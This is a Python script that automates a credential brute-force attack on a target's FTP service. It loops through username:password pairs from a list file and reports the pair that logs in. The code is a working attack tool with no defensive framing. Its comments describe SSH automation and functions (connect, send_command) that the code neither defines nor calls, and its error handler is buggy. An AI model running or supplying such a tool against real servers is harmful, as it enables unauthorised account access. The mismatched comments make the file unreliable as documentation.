#!/usr/bin/python3

# SCRIPT THAT AUTOMATES THE SSH LOGIN TO A GIVEN TARGET
# AND EXECUTES A SET OF COMMANDS [NON-INTERACTIVE]

import pexpect					# this module handles prompts and interactive behaviour in the target shell
import sys						# sys (system) module is used to handle the command line arguments
from termcolor import colored	# use colored text output on the terminal
import ftplib




def anoLogin(host):
	
	try:																											# tries to open the given file (can be modified to be taken as user input)
		file = open ("credList.txt", "r")
	except:																											# file name incorrect or file doesn't exist
		print(colored("[-] Error opening " + file + " : File doesn't exist!", "red"))
	
	for creds in file.readlines():																					# parsing file contents from known format USERNAME:PASSWORD
		usr = creds.split(":")[0]																					# split by ':' - left half = username
		pwd = creds.split(":")[1].strip()																			# split by ':' - right half = password
		print(colored("[!] Trying credential combination - " + usr + ":" + pwd, "yellow"))
		try:
			ftp = ftplib.FTP(host)																					# tries to open an FTP connection to the given host
			ftp.login(usr,pwd)																						# initiates login with username:password credential pair
			print(colored("[+] " + host + " FTP login successful!", "green"))										# login successful
			ftp.quit()
			return(usr,pwd)
		except:																										# login unsuccessful
			print(colored("[-] " + host + " FTP login failed!", "red"))

	print(colored("[-!] Correct Username : Password combination not found in credentials list!", "red"))			# if login credentials are not found in the credList.txt file





# STARTS THE PROGRAM
# TAKES INPUT FOR THE BASIC FIELDS
# REQUIRED TO CARRY OUT THE ATTACK AUTOMATICALLY
# INVOKES connect() FUNCTION TO CONNECT 
# AND send_command() FUNCTION TO EXECUTE THE (NON-INTERACTIVE) COMMAND

def main():
	
	host = input("[*] Enter the host IP of the target : ")
	anoLogin(host)	
	
main()
